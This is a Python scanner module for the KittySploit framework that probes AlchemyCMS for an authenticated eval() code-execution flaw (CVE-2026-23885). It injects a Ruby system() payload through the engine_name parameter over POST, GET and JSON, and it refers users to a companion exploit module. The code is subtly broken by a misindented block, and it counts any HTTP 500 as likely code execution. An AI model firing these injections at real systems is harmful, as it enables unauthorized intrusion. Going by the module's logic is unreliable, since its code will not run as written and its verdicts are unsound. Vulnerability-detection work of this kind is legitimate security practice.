#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse
import json
import time
import random
import string


class Module(Scanner, Http_client):

    __info__ = {
        'name': 'AlchemyCMS Authenticated eval() RCE Vulnerability Check',
        'description': 'Checks if the target is vulnerable to the authenticated RCE vulnerability '
                      '(CVE-2026-23885) in resource_url_proxy helper. The helper method '
                      'Alchemy::ResourcesHelper#resource_url_proxy in app/helpers/alchemy/resources_helper.rb '
                      'insecurely processes the engine_name attribute from a resource_handler object, '
                      'passing it directly to Ruby eval() without sanitization (CWE-95), allowing arbitrary '
                      'Ruby code and system command execution. This vulnerability requires an authenticated '
                      'user with administrative privileges.',
        'author': 'KittySploit Team',
        'tags': ['web', 'alchemycms', 'scanner', 'security', 'vulnerability', 'cms', 'rce', 'ruby', 'authenticated'],
        'references': [
            'https://github.com/AlchemyCMS/alchemy_cms',
            'https://cwe.mitre.org/data/definitions/95.html',  # CWE-95
        ]
    }

    admin_path = OptString("/admin", "AlchemyCMS admin path", required=False)
    resource_path = OptString("/admin/resources", "Path to resources endpoint", required=False)

    def check_alchemycms(self):
        """
        Check if the target is running AlchemyCMS
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response:
                # Check for AlchemyCMS indicators
                content = response.text.lower()
                headers = str(response.headers).lower()
                
                alchemy_indicators = [
                    'alchemy', 'alchemycms',
                    'alchemy_cms', 'alchemy-cms',
                    'alchemy/admin', 'alchemy/resources'
                ]
                
                if any(indicator in content or indicator in headers for indicator in alchemy_indicators):
                    return True
                
                # Check for AlchemyCMS admin path
                admin_path = self.admin_path if self.admin_path else "/admin"
                admin_response = self.http_request(method="GET", path=admin_path, allow_redirects=True)
                if admin_response and 'alchemy' in admin_response.text.lower():
                    return True
            
            return False
        except Exception as e:
            print_debug(f"Error checking AlchemyCMS: {e}")
            return False

    def test_eval_rce_vulnerability(self):
        """
        Test for the eval() RCE vulnerability by attempting to inject Ruby code
        """
        # Generate a unique test marker
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        test_marker = f"ALCHEMYCMS_RCE_TEST_{random_suffix}"
        
        # Create Ruby payload that outputs a test marker
        # The payload executes system() to echo a marker, then returns 'main_app' for eval()
        ruby_payload = f"system('echo {test_marker}'); 'main_app'"
        
        print_info(f"Testing for eval() RCE vulnerability...")
        print_debug(f"Ruby payload: {ruby_payload}")
        
            # Try multiple exploitation vectors
            exploit_paths = [
                self.resource_path if self.resource_path else "/admin/resources",
            "/admin/resources/new",
            "/admin/resources",
            "/admin/pages",
        ]
        
        for exploit_path in exploit_paths:
            # Method 1: Try via POST with engine_name parameter
            payload_data = {
                'resource_handler[engine_name]': ruby_payload,
            }
            
            try:
                response = self.http_request(
                    method="POST",
                    path=exploit_path,
                    data=payload_data,
                    allow_redirects=False,
                    timeout=10
                )
                
                if response:
                    # Check for indicators of code execution
                    # 500 error might indicate eval() execution attempt
                    if response.status_code == 500:
                        print_info(f"Received 500 error from {exploit_path} - possible code execution")
                        return True
                    
                    # Check if test marker appears in response (unlikely but possible)
                    if test_marker in response.text:
                        print_success(f"Test marker found in response - code execution confirmed!")
                        return True
            except Exception as e:
                print_debug(f"POST method failed: {e}")
            
            # Method 2: Try via GET with engine_name parameter
            params = {
                'engine_name': ruby_payload,
                'resource_handler[engine_name]': ruby_payload,
            }
            
            for param_name, param_value in params.items():
                try:
                    query_string = urllib.parse.urlencode({param_name: param_value})
                    full_path = f"{exploit_path}?{query_string}"
                    
                    response = self.http_request(
                        method="GET",
                        path=full_path,
                        allow_redirects=False,
                        timeout=10
                    )
                    
                    if response:
                        if response.status_code == 500:
                            print_info(f"Received 500 error from {exploit_path} - possible code execution")
                            return True
                        
                        if test_marker in response.text:
                            print_success(f"Test marker found in response - code execution confirmed!")
                            return True
                except Exception as e:
                    print_debug(f"GET method failed: {e}")
            
            # Method 3: Try via JSON payload (for API endpoints)
            json_payload = {
                'resource_handler': {
                    'engine_name': ruby_payload
                }
            }
            
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
            
            try:
                response = self.http_request(
                    method="POST",
                    path=exploit_path,
                    data=json.dumps(json_payload),
                    headers=headers,
                    allow_redirects=False,
                    timeout=10
                )
                
                if response:
                    if response.status_code == 500:
                        print_info(f"Received 500 error from {exploit_path} - possible code execution")
                        return True
                    
                    if test_marker in response.text:
                        print_success(f"Test marker found in response - code execution confirmed!")
                        return True
            except Exception as e:
                print_debug(f"JSON method failed: {e}")
            
            # Small delay between attempts
            time.sleep(0.5)
        
        return False

    def run(self):
        """
        Run the vulnerability check
        
        Returns:
            bool: True if vulnerable, False otherwise
        
        Note: This vulnerability requires administrative authentication to exploit.
        The scanner will attempt to detect the vulnerability but may have false negatives
        if authentication is required to access the vulnerable endpoint.
        """
        print_status("Checking for AlchemyCMS Authenticated eval() RCE vulnerability (CVE-2026-23885)...")
        print_warning("Note: This vulnerability requires administrative authentication")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # First, check if AlchemyCMS is present
        print_status("Checking if target is running AlchemyCMS...")
        if not self.check_alchemycms():
            print_warning("AlchemyCMS not detected on target")
            print_info("Target may not be running AlchemyCMS or is not accessible")
            self.vulnerable = False
            return False
        
        print_success("AlchemyCMS detected")
        print_info("")
        
        # Test for the vulnerability
        print_status("Testing for eval() RCE vulnerability...")
        is_vulnerable = self.test_eval_rce_vulnerability()
        
        if is_vulnerable:
            print_error("=" * 60)
            print_error("VULNERABLE: Authenticated eval() RCE vulnerability detected (CVE-2026-23885)!")
            print_error("=" * 60)
            print_warning("The target appears to be vulnerable to Authenticated Remote Code Execution")
            print_warning("via unsafe eval() in Alchemy::ResourcesHelper#resource_url_proxy")
            print_warning("(app/helpers/alchemy/resources_helper.rb - CWE-95)")
            print_info("")
            print_warning("IMPORTANT: This exploit requires administrative authentication")
            print_info("RECOMMENDATION: Use the exploit module with admin credentials to verify and exploit")
            print_info("Module: exploits/http/alchemycms_eval_rce")
            print_info("Required options: session_cookie OR (username + password)")
            print_error("=" * 60)
            self.vulnerable = True
            self.set_info(
                vulnerability="eval() RCE in resource_url_proxy",
                severity="Critical",
                description="Remote code execution via unsafe eval() in resource_url_proxy helper"
            )
            return True
        else:
            print_success("Target does not appear to be vulnerable")
            print_info("Note: This is a detection test and may have false negatives")
            print_info("The vulnerability may still exist but not be exploitable via tested vectors")
            self.vulnerable = False
            return False
